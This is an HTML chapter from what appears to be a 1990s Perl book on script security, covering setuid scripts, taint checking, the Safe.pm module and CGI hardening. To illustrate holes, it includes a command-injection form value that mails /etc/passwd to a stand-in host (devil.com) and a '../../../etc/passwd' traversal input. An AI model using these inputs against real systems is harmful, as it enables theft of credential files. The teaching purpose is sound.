<HTML>

<HEAD>
   <TITLE>Chapter 11 -- Security Issues in Perl </TITLE>
   <META NAME="GENERATOR" CONTENT="Mozilla/3.0b5aGold (WinNT; I) [Netscape]">
</HEAD>
<BODY TEXT="#000000" BGCOLOR="#FFFFFF" LINK="#0000EE" VLINK="#551A8B" ALINK="#CE2910">
<H1><FONT COLOR=#FF0000>Chapter 11</FONT></H1>
<H1><B><FONT SIZE=5 COLOR=#FF0000>Security Issues in Perl </FONT></B>
</H1>
<P>
<HR WIDTH="100%"></P>
<P>
<H3 ALIGN=CENTER><FONT COLOR="#000000"><FONT SIZE=+2>CONTENTS<A NAME="CONTENTS"></A>
</FONT></FONT></H3>

<UL>
<LI><A HREF="#AFewWordsBeforeWeBegin" >A Few Words Before We Begin</A>
<LI><A HREF="#SetuidScripts" >Setuid Scripts</A>
<LI><A HREF="#WhyIsPerlMoreSecure" >Why Is Perl More Secure Than Shell Scripts?</A>
<LI><A HREF="#SomeTipsonMakingScriptsSecure" >Some Tips on Making Scripts Secure</A>
<LI><A HREF="#ThePerlSafepmModule" >The Perl Safe.pm Module</A>
<UL>
<LI><A HREF="#UsingtheSafeClass" >Using the Safe Class</A>
</UL>
<LI><A HREF="#SetuidCGIScriptsandCGIwrap" >Setuid CGI Scripts and CGIwrap</A>
<LI><A HREF="#ReferenceBooks" >Reference Books</A>
<LI><A HREF="#Summary" >Summary</A>
</UL>
<HR>
<P>
This chapter addresses the security issues involved in writing
Perl scripts. Topics addressed in this chapter include writing
<TT><FONT FACE="Courier">setuid</FONT></TT> programs, tainted
variables, and using existing modules for use with Internet applications.
<H2><A NAME="AFewWordsBeforeWeBegin"><FONT SIZE=5 COLOR=#FF0000>A
Few Words Before We Begin</FONT></A></H2>
<P>
I feel like Chicken Little when discussing potential security
problems with Perl scripting. The potential problems discussed
here are hard to have all reside on one system. Also, a hacker
has to be really interested in your system (and malicious enough)
to really want to blow it away. However, being paranoid is better
than being lax about security, and having that one little hole
can cause you to lose your hard disk. There are a few weirdos
out there who get a kick out of obliterating other folks' data.
Sometimes exceedingly bright people commit the most idiotic acts.
<P>
Chances are that you'll not get hit, but a few precautionary steps
will not hurt. If you are a system administrator for a large institution
or university, your job is especially hard. The greater the number
of users on your system, the more likely you are to find someone
attempting to break into your system. There are some things you
can do such as running a <TT><FONT FACE="Courier">find</FONT></TT>
command every day to check whether there are <TT><FONT FACE="Courier">setuid</FONT></TT>
executable scripts on your system's <TT><FONT FACE="Courier">/home</FONT></TT>
directory. Please check the references at the end of this chapter
for books with more information about keeping your site secure.
<P>
Finally, this chapter is slanted towards Perl and CGI applications
using UNIX. More problems exist with C programs, daemons, and
so on with buffer overruns. Some reported problems even include
harmful results such as wiping a disk clean when you download
a PostScript file. For example, David Bonn reported in the <I>Linux
Journal</I> that downloading a Crusty the Clown PostScript image
wiped his hard disk clean. The offending commands were part of
a buffer overrun in his PostScript viewer.
<P>
I will get off the soapbox now.
<H2><A NAME="SetuidScripts"><TT><FONT SIZE=5 COLOR=#FF0000 FACE="Courier">Setuid</FONT></TT><FONT SIZE=5 COLOR=#FF0000>
Scripts</FONT></A></H2>
<P>
A <TT><FONT FACE="Courier">setuid</FONT></TT> script runs at the
level of the owner, not the calling program. In other words, if
a script has its <TT><FONT FACE="Courier">suid</FONT></TT> bit
set, it runs as root, even if it is being called by a non-root
program. In almost all cases, <TT><FONT FACE="Courier">setuid</FONT></TT>
scripts are bad news, a big security hole, and potentially dangerous
for your system. Most administrators write <TT><FONT FACE="Courier">setuid</FONT></TT>
scripts when they want to grant limited access to secure files
or devices. In most cases, these scripts are not necessary, and
in my humble opinion, should be written as compiled programs.
<P>
Calling scripts from within programs running as root is a very
big security hole in any system. For example, let's say a program
running as root calls a Perl script called <TT><FONT FACE="Courier">diskme.pl</FONT></TT>
in the <TT><FONT FACE="Courier">/usr/bin</FONT></TT> directory,
or worse, in an area that is accessible by users other than root.
When the program running as root executes <TT><FONT FACE="Courier">diskme.pl</FONT></TT>,
the code in <TT><FONT FACE="Courier">diskme.pl</FONT></TT> is
also run with root privileges. If the <TT><FONT FACE="Courier">diskme.pl</FONT></TT>
has permissions that allow it to be edited or overwritten, hackers
could write their own version of <TT><FONT FACE="Courier">diskme.pl</FONT></TT>
and place it where the root program expects it to be. When the
original root program calls <TT><FONT FACE="Courier">diskme.pl</FONT></TT>,
it will execute the rogue program instead of the original one.
<P>
One common way to avoid problems like this one is to use absolute
pathnames instead of relative pathnames. Using relative pathnames
opens your <TT><FONT FACE="Courier">setuid</FONT></TT> script
to unsafe links to rogue files. An absolute path defines a complete
path to the executable program. For example, <TT><FONT FACE="Courier">/home/khusain/scripts/test.pl</FONT></TT>
will always run the program <TT><FONT FACE="Courier">test.pl</FONT></TT>
in the <TT><FONT FACE="Courier">/home/khusain/scripts</FONT></TT>
directory. The forward slash (/) in the pathname is used to specify
the complete pathname. If the forward slash were left out, that
is, the name of the program was specified as <TT><FONT FACE="Courier">home/khusain/scripts/test.pl</FONT></TT>,
the program loads <TT><FONT FACE="Courier">test.pl</FONT></TT>
from a subdirectory under <TT><FONT FACE="Courier">./home/khusain/scripts</FONT></TT>.
Thus, it uses a path relative to its current location. It would
be easy to move the privileged program that calls the <TT><FONT FACE="Courier">test.pl</FONT></TT>
file over to another directory, create a subdirectory path <TT><FONT FACE="Courier">home/khusain/scripts</FONT></TT>
in this new location and place my own version of <TT><FONT FACE="Courier">test.pl</FONT></TT>
in there. Now the privileged program will call my version of <TT><FONT FACE="Courier">test.pl</FONT></TT>!
<P>
Another route to take for security reasons is to minimize the
time required to be root. Just because your script has to access
some portions of some data as root does not mean that the entire
application has to run as root. Just make a small, difficult-to-alter
Perl script that runs as root and leave the rest in an unprivileged
script.
<P>
Let me reiterate once more: <TT><FONT FACE="Courier">setuid</FONT></TT>
scripts are insecure. Regardless of how many precautions you take,
having a Perl script that may be influenced by its environment
is asking for trouble. If you can avoid writing <TT><FONT FACE="Courier">setuid</FONT></TT>
scripts, do so.
<H2><A NAME="WhyIsPerlMoreSecure"><FONT SIZE=5 COLOR=#FF0000>Why
Is Perl More Secure Than Shell Scripts?</FONT></A></H2>
<P>
Perl inherently has more features than most shells such as Bourne,
Korn, or Bash. Network, file system manipulation and binary file
access features built into Perl have to be mimicked through the
use of other external programs in shell scripts. When the <TT><FONT FACE="Courier">setuid</FONT></TT>
shell calls these external programs, they are opened to potential
problems because external programs can be replaced with less secure
imitations. Perl does not use such external programs because the
features required by Perl are built into itself. This would lead
you to think that Perl scripts are more secure than shell scripts.
On the contrary, Perl is not as secure as you think it is. Read
on.
<P>
First of all, use the <TT><FONT FACE="Courier">use strict;</FONT></TT>
statement whenever possible in your Perl scripts. Using the <TT><FONT FACE="Courier">strict</FONT></TT>
pragma forces Perl to do strict type checking, prevents strings
from becoming variables, and points out any dangling variables.
Using <TT><FONT FACE="Courier">strict</FONT></TT> forces you to
use the <TT><FONT FACE="Courier">my</FONT></TT> keyword when declaring
local variables. This, in turn, limits the scope of declared variables
from being destroyed accidentally by other subroutines in the
system.
<P>
Even without strict type checking, the Perl interpreter is more
efficient and security conscious than a shell. Shell script lines
are parsed more times per line than are lines of code in a Perl
script. Perl code can be further tightened to check for potential
problems or funny use of references by enabling the <TT><FONT FACE="Courier">-w</FONT></TT>
switch at the command line for the Perl interpreter. (The <TT><FONT FACE="Courier">-w</FONT></TT>
switch turns on warnings.)
<P>
Perl also supports the use of and recognizes &quot;tainted&quot;
variables. In Perl, any command-line argument, environment variable,
or input explicitly marked as tainted will not be used in subshells.
Tainted variables cannot be used in any commands that modify the
file and dir-ectory structure on the client on which the application
happens to be running. In fact, if a new value is derived from
a tainted value, the new value is also marked as tainted. This
way tainted variables cannot create a non-tainted variable. Once
a bad egg, always a bad egg! No mercy here.
<P>
Also, the &quot;taintedness&quot; of a variable is applied on
a Perl scalar basis. Arrays and hashes can contain both tainted
and untainted variables at one time. Perl checks for improper
use of tainted variables if the <TT><FONT FACE="Courier">-T</FONT></TT>
flag is set. So when in doubt, run with the <TT><FONT FACE="Courier">-T</FONT></TT>
option. Your header comment line will then look like this:
<BLOCKQUOTE>
<TT><FONT FACE="Courier">#!/usr/local/bin/perl -T</FONT></TT>
</BLOCKQUOTE>
<P>
Here's a checklist to use to see whether a variable is tainted.
If you answer even one <I>yes</I> to any of the following questions,
the variable is most likely tainted:
<UL>
<LI><FONT COLOR=#000000>Was this variable passed in from the command
line?</FONT>
<LI><FONT COLOR=#000000>Was this variable set to a value passed
in from the command line?</FONT>
<LI><FONT COLOR=#000000>Is this value read directly from the command
line or a file handle?</FONT>
<LI><FONT COLOR=#000000>Is this value read directly from an environment
variable?</FONT>
<LI><FONT COLOR=#000000>Is this variable set from a variable whose
value was read directly from the command line or a file handle?</FONT>
<LI><FONT COLOR=#000000>Has the </FONT><TT><FONT FACE="Courier">PATH</FONT></TT>
been set to a known value before this value was set?
<LI><FONT COLOR=#000000>Was an external program used in determining
the value of this variable? That is, was this variable set by
a call like this one: </FONT><TT><FONT FACE="Courier">$name =
`cat  $hokeyfilename`;</FONT></TT>?
<LI><FONT COLOR=#000000>Was there any system call to </FONT><TT><FONT FACE="Courier">unlink</FONT></TT>,
<TT><FONT FACE="Courier">umask</FONT></TT>, or overwrite files?
<LI><FONT COLOR=#000000>Was there any complete command between
single quotes? For example, using </FONT><TT><FONT FACE="Courier">exec
$cmd $arg</FONT></TT> instead of <TT><FONT FACE="Courier">exec
'$cmd'</FONT></TT>, <TT><FONT FACE="Courier">'arg1'</FONT></TT>,
<TT><FONT FACE="Courier">'arg2'</FONT></TT>, &#133;?
</UL>
<P>
As you begin to use Perl scripts, you can see how variables can
be tainted and how system files can be corrupted by using potentially
dangerous variable paths. Of course, testing and being a little
on the paranoid side does help in flushing out security holes.
Ask yourself this question when testing scripts for security violations:
If I were a hacker, is there any way I can use this script to
break into my system?
<H2><A NAME="SomeTipsonMakingScriptsSecure"><FONT SIZE=5 COLOR=#FF0000>Some
Tips on Making Scripts Secure</FONT></A></H2>
<P>
The first thing to do when making a Perl script secure is to set
the effective user and group <TT><FONT FACE="Courier">id</FONT></TT>s
to the same as the real user and group <TT><FONT FACE="Courier">id</FONT></TT>s
of the process. This is done with the following lines, which should
be placed before any calls that manipulate files or directories:
<BLOCKQUOTE>
<TT><FONT FACE="Courier">$&gt; = $&lt;   # set effective user
Ids to real id.<BR>
$) = $(   # set group id to real id.</FONT></TT>
</BLOCKQUOTE>
<P>
Next, make sure that you reset at least these two environment
variables to a known value:
<BLOCKQUOTE>
<TT><FONT FACE="Courier">$ENV{'PATH'} = '/bin:/usr/bin';<BR>
$ENV{'IFS'} = '' if $ENV{'IFS'} ne '';</FONT></TT>
</BLOCKQUOTE>
<P>
Force the path to a known value so that unknown programs cannot
be inserted and executed from writable locations in the path.
The <TT><FONT FACE="Courier">IFS</FONT></TT> field is set to a
<TT><FONT FACE="Courier">null</FONT></TT> value to prevent any
misuse of inter-field characters.
<P>
Another thing to do is to explicitly create your own strings rather
than use strings expanded by the shell. If you are making a call
to <TT><FONT FACE="Courier">exec</FONT></TT>, pass each argument
explicitly, not as a complete string that could have been tainted
by the caller's shell program. For example, avoid the use of a
statement like this:
<BLOCKQUOTE>
<TT><FONT FACE="Courier">exec 'myprog @arglist';</FONT></TT>
</BLOCKQUOTE>
<P>
Instead, use statements like this one:
<BLOCKQUOTE>
<TT><FONT FACE="Courier">exec 'myprog', 'arg1', 'arg2', 'arg3';</FONT></TT>
</BLOCKQUOTE>
<P>
This prevents someone from sending more than one argument to a
program. You can use the Perl <TT><FONT FACE="Courier">system()</FONT></TT>,
which like <TT><FONT FACE="Courier">exec()</FONT></TT>, calls
without invoking a shell by supplying more than one argument:
<BLOCKQUOTE>
<TT><FONT FACE="Courier">system('/usr/bin/ls', '-a');</FONT></TT>
</BLOCKQUOTE>
<P>
Pipes are a potential leak in systems, as well. You can use the
<TT><FONT FACE="Courier">open()</FONT></TT> call to get the same
functionality as <TT><FONT FACE="Courier">popen()</FONT></TT>
(but without starting a shell) with a call of the form:
<BLOCKQUOTE>
<TT><FONT FACE="Courier">open(FH, '|-') || exec(&quot;program&quot;,
$arg1, $arg2);</FONT></TT>
</BLOCKQUOTE>
<P>
Finally, whenever you are dealing with pathnames, be sure to check
for the <TT><FONT FACE="Courier">..</FONT></TT> component. The
seemingly safe line to get <TT><FONT FACE="Courier">man</FONT></TT>
pages via HTML pages can be exploited, too. Consider this line:
<BLOCKQUOTE>
<TT><FONT FACE="Courier">open(MANPAGE, &quot;/usr/man/man1/$filename$section&quot;);</FONT></TT>
</BLOCKQUOTE>
<P>
You can get to the password file if the user-supplied filename
has <TT><FONT FACE="Courier">$filename</FONT></TT> set to <TT><FONT FACE="Courier">../../../etc/passwd</FONT></TT>
and <TT><FONT FACE="Courier">$section = &quot; &quot;</FONT></TT>.
Check to see whether the filename has <TT><FONT FACE="Courier">..</FONT></TT>
in it for abuse at the server side. Don't process filenames that
make you traverse upwards. Use explicit, full pathnames wherever
possible.
<P>
There is a time lag between the point where a kernel determines
whether a script is <TT><FONT FACE="Courier">setuid</FONT></TT>
and the time the Perl interpreter executes the script. The script
could be a symbolic link and therefore can be modified during
this time interval. It's hard to do, but not impossible.
<P>
Some kernels do not allow <TT><FONT FACE="Courier">setuid</FONT></TT>
scripts, period. This is somewhat too limiting in most systems
because such a blanket order prevents you from doing even legitimate
tasks. The other route is to simply ignore the <TT><FONT FACE="Courier">setuid</FONT></TT>
bit setting in the kernel and run only at user level. You can
still use the built-in Perl mechanism to emulate the <TT><FONT FACE="Courier">setuid</FONT></TT>
behavior. However, if the kernel allows you to run <TT><FONT FACE="Courier">setuid</FONT></TT>
scripts as root, and the bit is set, Perl will display a warning
message about security. At this point, either disable the Perl
script or call it from a C program.
<H2><A NAME="ThePerlSafepmModule"><FONT SIZE=5 COLOR=#FF0000>The
Perl </FONT><TT><FONT SIZE=5 COLOR=#FF0000 FACE="Courier">Safe.pm</FONT></TT><FONT SIZE=5 COLOR=#FF0000>
Module</FONT></A></H2>
<P>
The Perl <TT><FONT FACE="Courier">Safe.pm</FONT></TT> module is
written by Malcolm Beattie (<TT><FONT FACE="Courier">mbeattie@sable.ox.ac.uk</FONT></TT>)
and is designed to test Perl code to see how it will work in the
real world. The <TT><FONT FACE="Courier">Safe</FONT></TT> extension
module creates two &quot;compartments&quot; in which code can
be tested. A <I>compartment</I> is simply a known environment
that does not allow system access.
<P>
A compartment has a name space other than <TT><FONT FACE="Courier">main::</FONT></TT>.
Any variables declared in the new name space cannot access variables
outside this name space. Added to this name space wrapper is the
notion of an operator mask. Basically, an operator mask is an
array of elements, each with a value of <TT><FONT FACE="Courier">0</FONT></TT>
or <TT><FONT FACE="Courier">1</FONT></TT>, indicating which operators
Perl can use and which operators it cannot use. Therefore, most
global variables are shielded from the wrapped section of code
in a <TT><FONT FACE="Courier">Safe</FONT></TT> object.
<P>
The special variables <TT><FONT FACE="Courier">$_</FONT></TT>,<B>
</B><TT><FONT FACE="Courier">@_</FONT></TT>,<B> </B><TT><FONT FACE="Courier">_</FONT></TT>,
and <TT><FONT FACE="Courier">%_</FONT></TT> are still available
to the wrapped section of code. In fact, these special variables
are also shared between different enclosed name spaces. The requirement
to allow these variables to be shared is necessary to allow parameter
passing between subroutines in a wrapped code section.
<H3><A NAME="UsingtheSafeClass">Using the <TT><FONT SIZE=4 FACE="Courier">Safe</FONT></TT><FONT SIZE=4>
Class</FONT></A></H3>
<P>
To use the <TT><FONT FACE="Courier">Safe</FONT></TT> class, you
have to take the following steps:
<UL>
<LI><FONT COLOR=#000000>Create a compartment.</FONT>
<LI><FONT COLOR=#000000>Perform unsafe operations using the compartment.</FONT>
<LI><FONT COLOR=#000000>When unsafe operations are over, delete
the partition.</FONT>
</UL>
<P>
A new compartment is created using a new <TT><FONT FACE="Courier">Safe</FONT></TT>
object. Both arguments to the call to create a <TT><FONT FACE="Courier">Safe</FONT></TT>
object are optional in the syntax shown here:
<BLOCKQUOTE>
<TT><FONT FACE="Courier">$cpt = new Safe( $namespace, $mask );</FONT></TT>
</BLOCKQUOTE>
<P>
where<TT><FONT FACE="Courier"> $namespace</FONT></TT> is the root
name space to use instead of <TT><FONT FACE="Courier">main::</FONT></TT>.
If you do not specify this name space, the default name of <TT><FONT FACE="Courier">Safe::Root000000000</FONT></TT>
is used. The zeroes in the number portion of the default name
space are incremented on the creation of every new name space
object. This way you can have separate name spaces for separate
modules.
<P>
The operator mask to use is simply an array of <TT><FONT FACE="Courier">MAXO</FONT></TT>
integers. The value of <TT><FONT FACE="Courier">MAXO</FONT></TT>
is the number of operators in your Perl interpreter. Each element
of the array maps to a Perl operator and has the value of <TT><FONT FACE="Courier">0</FONT></TT>
or <TT><FONT FACE="Courier">1</FONT></TT>. If an element is <TT><FONT FACE="Courier">1</FONT></TT>,
the Perl operator is not permitted to execute; a value of <TT><FONT FACE="Courier">0</FONT></TT>
for an element allows Perl to execute that operator. Therefore,
by judiciously setting the mask elements, you can specify which
commands to execute in your Perl program.
<P>
The default value of the operator mask removes all system and
file operations. Therefore, by default, you cannot create, write
to, or remove files and directories. Interprocess communication
operations are not permitted either. However, input/output operations
via pipes and reading from <TT><FONT FACE="Courier">stdin</FONT></TT>
and writing to <TT><FONT FACE="Courier">stdout</FONT></TT> are
permitted. Any file handles passed into the file handle are considered
secure and any operations on handles that are already opened are
also allowed.
<P>
The <TT><FONT FACE="Courier">Safe</FONT></TT> module file contains
routines for mapping operator names into the operator <TT><FONT FACE="Courier">mask</FONT></TT>
and <TT><FONT FACE="Courier">back</FONT></TT>. Once you have the
object, you can perform the following operations on it:
<BLOCKQUOTE>
<TT><FONT FACE="Courier">$namespace = $secure-&gt;root()  # returns
the namespace</FONT></TT>
</BLOCKQUOTE>
<P>
To set the name space to a new value, pass the name in the argument
list:
<BLOCKQUOTE>
<TT><FONT FACE="Courier">$newName = &quot;krago&quot;<BR>
$secure-&gt;root($newName);</FONT></TT>
</BLOCKQUOTE>
<P>
The mask can be retrieved and reset using the following method
from outside the wrapped code. The following code disallows all
shared memory operations, but allows any messaging facilities:
<BLOCKQUOTE>
<TT><FONT FACE="Courier">require Safe;<BR>
$secure = new Safe;<BR>
<BR>
@defMask = $secure-&gt;mask();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#
get the mask<BR>
$secure-&gt;trap(OP_SHMGET,OP_SHMCTL,OP_SHMREAD,OP_SHMWRITE);
<BR>
$secure-&gt;untrap(OP_MSGCTL,OP_MSGGET,OP_MSGSND,OP_MSGRCV);<BR>
$secure-&gt;mask(@defmask);<BR>
<BR>
open(DBFILE,'myCredit.File') || die &quot; Whoa! Canna open Kaptain!&quot;;
<BR>
<BR>
sub safecode {<BR>
</FONT></TT>&nbsp;&nbsp;&nbsp;&nbsp;<TT><FONT FACE="Courier">
#<BR>
&nbsp;&nbsp;&nbsp;&nbsp; # Open database and do credit card transaction.
<BR>
</FONT></TT>&nbsp;&nbsp;&nbsp;&nbsp;<TT><FONT FACE="Courier">
#<BR>
&nbsp;&nbsp;&nbsp;&nbsp; while (&lt;DBFILE&gt;)<BR>
</FONT></TT>&nbsp;&nbsp;&nbsp;&nbsp;<TT><FONT FACE="Courier">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
<BR>
print $_;<BR>
</FONT></TT>&nbsp;&nbsp;&nbsp;&nbsp;<TT><FONT FACE="Courier">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
<BR>
}<BR>
<BR>
$secure-&gt;share('&amp;safecode', DBFILE);</FONT></TT>
</BLOCKQUOTE>
<P>
The <TT><FONT FACE="Courier">trap()</FONT></TT> and <TT><FONT FACE="Courier">untrap()</FONT></TT>
methods force the <TT><FONT FACE="Courier">Safe</FONT></TT> package
to trap and untrap instructions, respectively. The names of the
operators available to your program are listed in the <TT><FONT FACE="Courier">opcode.pl</FONT></TT>
and <TT><FONT FACE="Courier">opcode.h</FONT></TT>. The <TT><FONT FACE="Courier">share()</FONT></TT>
method makes the values specified in the argument list available
to the compartment's code. Therefore, the variables and statements
in the <TT><FONT FACE="Courier">safecode</FONT></TT> subroutine
are made available to the compartment. In the <TT><FONT FACE="Courier">safecode</FONT></TT>
compartment (shown previously), the <TT><FONT FACE="Courier">DBFILE</FONT></TT>
handle can be used in the subroutine <TT><FONT FACE="Courier">safecode</FONT></TT>
to retrieve the data.
<P>
The <TT><FONT FACE="Courier">Safe</FONT></TT> package also contains
utility subroutines for modifying name spaces and masks. To create
a mask by giving a list of operator names, use the <TT><FONT FACE="Courier">ops_to_mask()</FONT></TT>
function, which returns a mask with only those masked operators
that appear in the function's argument list. For example, to return
a mask with only <TT><FONT FACE="Courier">OP_SETPRIORITY</FONT></TT>
masked, use this call:
<BLOCKQUOTE>
<TT><FONT FACE="Courier">@mymask = ops_to_mask(OP_SETPRIORITY);</FONT></TT>
</BLOCKQUOTE>
<P>
The inverse of this call is to get a list of operator names given
an operator mask: <TT><FONT FACE="Courier">mask_to_ops (MASK)</FONT></TT>.
The names returned are those variables that are masked for the
package. The function <TT><FONT FACE="Courier">fullmask()</FONT></TT>
returns all ones and <TT><FONT FACE="Courier">emptymask()</FONT></TT>
returns all zeros. The function <TT><FONT FACE="Courier">MAXO()</FONT></TT>
returns the number of operators in this version of Perl.
<H2><A NAME="SetuidCGIScriptsandCGIwrap"><TT><FONT SIZE=5 COLOR=#FF0000 FACE="Courier">Setuid</FONT></TT><FONT SIZE=5 COLOR=#FF0000>
CGI Scripts and CGIwrap</FONT></A></H2>
<P>
CGI scripts are written in Perl mainly because of Perl's string
handling feature, as well as other powerful features. It's important
to discuss CGI security issues when using Perl.
<P>
A point to note about CGI scripts (which are more than likely
to be written in Perl): Most <TT><FONT FACE="Courier">httpd</FONT></TT>
daemons run as user &quot;nobody&quot; and do not change the <TT><FONT FACE="Courier">uid</FONT></TT>
to the CGI script's owner. Some daemons use a program called CGIwrap,
which provides a safer way to change user IDs. The latest version
of CGIwrap can be found with full documentation and source and
installation instructions at the following address:
<BLOCKQUOTE>
<TT><A HREF="tppmsgs/msgs0.htm#11" tppabs="http://wwwcgi.umr.edu/~cgiwrap">http://wwwcgi.umr.edu/~cgiwrap</A></TT>
</BLOCKQUOTE>
<P>
In any event, do not allow your CGI files the capability to write
to a file by giving write access to a &quot;nobody&quot; user.
Close your eyes and think of the entire sunsite archive on your
disk choking it to death. Whatever you do, never make CGI scripts
<TT><FONT FACE="Courier">setuid</FONT></TT>, period. <TT><FONT FACE="Courier">setuid</FONT></TT>
scripts have many more security holes than do normal CGI scripts
and are much more easily accessed from the rest of the world.
<P>
The easiest way to exploit <TT><FONT FACE="Courier">setuid</FONT></TT>
scripts is by modifying any used environment variables. Old versions
of Perl used to call the <TT><FONT FACE="Courier">csh</FONT></TT>
to process globs of the form <TT><FONT FACE="Courier">&lt;*.c&gt;</FONT></TT>
in <TT><FONT FACE="Courier">eval</FONT></TT> statements. Providing
your own version of <TT><FONT FACE="Courier">csh</FONT></TT> for
the Perl interpreter could get you running as root.
<P>
Finally, the biggest faux pas of all is to place <TT><FONT FACE="Courier">perl.exe</FONT></TT>
in your <TT><FONT FACE="Courier">cgi-bin</FONT></TT> directory.
Do not do this! Putting your Perl.exe program in a globally executable
area is unforgivable because all you have to do is change the
top line of every Perl CGI script to point to Perl.
<P>
If you see a site being accessed via a URL as
<BLOCKQUOTE>
<TT>http://somewhere.com/cgibin/perl.exe?dothis.pl</TT>
</BLOCKQUOTE>
<P>
you know you are dealing with someone who is not concerned about
potentially running any script on his or her computer. How to
do this is left as an exercise for the reader. (Hint: try to recall
the command-line arguments to Perl.) Actually, some newsgroups
have had messages posted on them that indicate the regular search
engines like Alto Vista hunt down sites with gaping chasms in
security.
<P>
A common mistake in Perl is to use the following line in a <TT><FONT FACE="Courier">cgi-script</FONT></TT>:
<BLOCKQUOTE>
<TT><FONT FACE="Courier">system(&quot;/usr/sbin/sendmail -t $returnAddress
&lt; $data&quot;);</FONT></TT>
</BLOCKQUOTE>
<P>
The system call shown above is sending contents of <TT><FONT FACE="Courier">$data</FONT></TT>
back to the address provided for by the variable <TT><FONT FACE="Courier">$returnAddress</FONT></TT>.
If both the values in <TT><FONT FACE="Courier">$data</FONT></TT>
and <TT><FONT FACE="Courier">$returnAddress</FONT></TT> rely on
environment variables, or worse yet, are in <TT><FONT FACE="Courier">FORM</FONT></TT>
field entries, you are opening your system up to a hacker who
can supply the name of a valuable file in <TT><FONT FACE="Courier">$data</FONT></TT>.
A hacker will be then able to return anything, including password
files, with this hole. On the hacker's side the command will set
the <TT><FONT FACE="Courier">VALUE</FONT></TT> of the request
to something like this:
<BLOCKQUOTE>
<TT><FONT FACE="Courier">VALUE=&quot;khusain@ikra.com;mail nosy@devil.com
&lt;/etc/passwd&quot;</FONT></TT>
</BLOCKQUOTE>
<P>
In Perl, the <TT><FONT FACE="Courier">system</FONT></TT> command
is not the only command that will fork off a shell. Using <TT><FONT FACE="Courier">exec</FONT></TT>,
<TT><FONT FACE="Courier">eval</FONT></TT>, <TT><FONT FACE="Courier">pipe</FONT></TT>s,
or <TT><FONT FACE="Courier">backtick</FONT></TT>s will do the
same operation for you. The <TT><FONT FACE="Courier">eval</FONT></TT>
statement is potentially dangerous because it's the easiest to
bypass, even with the <TT><FONT FACE="Courier">-T</FONT></TT>
tainting checking flag turned on in Perl.
<P>
When sending mail, don't use <TT><FONT FACE="Courier">system()</FONT></TT>
calls. Rather, open a handle to <TT><FONT FACE="Courier">sendmail</FONT></TT>
directly. For example, use the following set of statements instead
of a system call:
<BLOCKQUOTE>
<TT><FONT FACE="Courier">open(MAIL, &quot;|/usr/lib/sendmail -t&quot;);
<BR>
print MAIL &quot;To: $myfriend\n&quot;;<BR>
</FONT></TT>&nbsp;&nbsp;&nbsp;<TT><FONT FACE="Courier">...<BR>
close(MAIL);</FONT></TT>
</BLOCKQUOTE>
<P>
Note the use of <TT><FONT FACE="Courier">sendmail</FONT></TT>,
not <TT><FONT FACE="Courier">mail</FONT></TT>, in this example.
The <TT><FONT FACE="Courier">mail</FONT></TT> program has a bug
in it that allows you to execute commands by preceding them with
a tilde (<TT><FONT FACE="Courier">~</FONT></TT>). The bug has
been fixed on newer systems, but can be a potential threat if
your system is not up-to-date.
<P>
Finally, it's also known that some programs exploit escape characters
in UNIX to run commands. Some of these potentially dangerous escape
characters are the semicolon (for continuing commands), the tilde
(<TT><FONT FACE="Courier">~</FONT></TT>), the at sign (<TT><FONT FACE="Courier">@</FONT></TT>
in mail fraud), the bang operator (<TT><FONT FACE="Courier">!</FONT></TT>),
and so on. You should just prepend the escape characters with
the backslash, thus rendering these escape characters useless
for the first pass through the <TT><FONT FACE="Courier">eval()</FONT></TT>
in Perl:
<BLOCKQUOTE>
<TT><FONT FACE="Courier">sub sanctify {<BR>
&nbsp;&nbsp;# will change, for example, user!sh to user\!sh<BR>
</FONT></TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<TT><FONT FACE="Courier">my
@a = @_<BR>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@a =~ s/([;&lt;&gt;\*\|`&amp;\$!#\(\)\[\]\{\}:'&quot;])/\\$1/g;
<BR>
</FONT></TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<TT><FONT FACE="Courier">return
@a;<BR>
&nbsp;&nbsp;}</FONT></TT>
</BLOCKQUOTE>
<P>
The solution will only catch and replace those characters shown
here. You should look at your system closely to see what other
characters may cause potential problems.
<H2><A NAME="ReferenceBooks"><FONT SIZE=5 COLOR=#FF0000>Reference
Books</FONT></A></H2>
<P>
The following texts will provide you with more information about
security and Perl scripts. Please remember that this is only a
partial list:
<UL>
<LI><I>Practical UNIX Security</I>, Simon Garfinkel and Gene Spafford,
O'Reilly &amp; Associates, 1-56592-148-8, 1996.
<LI><I>Firewalls and Internet Security</I>, William Cheswick and
Steven M Bellovin, Addison-Wesley, 0-201-63357-4, 1994.
<LI><I>Essential System Administration</I>, Aeleen Frisch, O'Reilly
&amp; Associates, Second edition, 1-56592-127-5, 1995.
</UL>
<H2><A NAME="Summary"><FONT SIZE=5 COLOR=#FF0000>Summary</FONT></A>
</H2>
<P>
Security issues are becoming increasingly important in the computing
world today. As more computers go online, more machines are being
opened up for attacks by hackers, especially because more CGI
scripts are written in Perl. Use the <TT><FONT FACE="Courier">-T</FONT></TT>
taint feature in Perl 5. Use the <TT><FONT FACE="Courier">Safe.pm</FONT></TT>
module if you can. Also, never place <TT><FONT FACE="Courier">perl.exe</FONT></TT>
in the <TT><FONT FACE="Courier">cgi-bin</FONT></TT> directory
and never let your Perl scripts run off a shell command that cannot
be written to. Remember that keeping Perl scripts secure in CGI
environments is an ongoing issue.
<P>
<HR WIDTH="100%"></P>

<CENTER><P><A HREF="ch10.htm" tppabs="http://www.mcp.com/818726400/0-672/0-672-30891-6/ch10.htm"><IMG SRC="pc.gif" tppabs="http://www.mcp.com/818726400/0-672/0-672-30891-6/pc.gif" BORDER=0 HEIGHT=88 WIDTH=140></A><A HREF="#CONTENTS"><IMG SRC="cc.gif" tppabs="http://www.mcp.com/818726400/0-672/0-672-30891-6/cc.gif" BORDER=0 HEIGHT=88 WIDTH=140></A><A HREF="index.htm" tppabs="http://www.mcp.com/818726400/0-672/0-672-30891-6/index.htm"><IMG SRC="hb.gif" tppabs="http://www.mcp.com/818726400/0-672/0-672-30891-6/hb.gif" BORDER=0 HEIGHT=88 WIDTH=140></A><A HREF="ch12.htm" tppabs="http://www.mcp.com/818726400/0-672/0-672-30891-6/ch12.htm"><IMG 
